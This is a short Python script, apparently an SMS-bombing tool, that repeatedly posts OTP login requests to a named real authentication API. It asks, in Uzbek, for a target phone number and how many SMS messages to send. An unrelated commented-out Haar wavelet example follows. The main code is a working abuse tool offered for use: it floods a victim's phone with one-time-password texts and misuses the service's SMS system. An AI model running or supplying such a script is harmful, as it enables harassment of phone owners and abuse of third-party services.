import requests
import time

def send_otp_request(phone_number, max_retries=9):
    url = "https://api.auth.newmediapark.uz/login-otp"

    headers = {
        "Host": "api.auth.newmediapark.uz",
    }

    payload = {
        "role_id": "06d63125-e7a2-4616-afa4-cd50ee3ac33d",
        "language": "ru",
        "username": phone_number,
        "source": "web"
    }

    sms_request_count = 0

    while sms_request_count < max_retries:
        response = requests.post(url, json=payload, headers=headers)

        sms_request_count += 1

        if response.status_code == 201:
            print(f"{sms_request_count}. SMS Yuborildi")
        else:
            print(f"{sms_request_count}. Xatolik SMS Yuborilmadi")
            time.sleep(1)

    print(f"Dastur tugadi: {sms_request_count} marta so'rov jo'natildi.")

phone_number = input("Telefon raqam kirinting (masalan, +998901234567): ")

num_requests = int(input("Nechta SMS yuborsasiz (masalan, 5): "))

send_otp_request(phone_number, num_requests)


# import pywt
# import numpy as np


# matritsa1 = np.array(
#     [
#         [219, 79, 133, 43, 241, 141, 103, 124],
#         [122, 58, 215, 189, 154, 66, 69, 154],
#         [116, 148, 17, 52, 99, 242, 92, 131],
#         [203, 84, 144, 108, 58, 111, 116, 11],
#         [130, 89, 76, 234, 155, 226, 162, 203],
#         [210, 3, 1, 90, 159, 104, 121, 14],
#         [126, 14, 211, 43, 81, 188, 126, 54],
#         [27, 1, 192, 195, 191, 33, 148, 107],
#     ]
# )


# coeffs = pywt.dwt2(matritsa1, "haar")


# cA, (cH, cV, cD) = coeffs
# print(cA)
# print(cH)
# print(cV)
# print(cD)
